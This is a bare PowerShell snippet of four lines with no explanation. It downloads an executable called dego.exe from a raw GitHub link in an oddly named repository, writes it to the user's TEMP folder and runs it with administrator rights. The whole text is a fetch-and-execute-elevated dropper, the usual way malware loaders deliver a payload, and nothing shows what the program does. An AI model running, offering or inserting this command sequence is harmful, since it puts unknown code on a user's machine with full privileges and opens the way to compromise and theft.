$url = "https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dego.exe"
$out = "$env:TEMP\dego.exe"
Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
Start-Process $out -Verb RunAs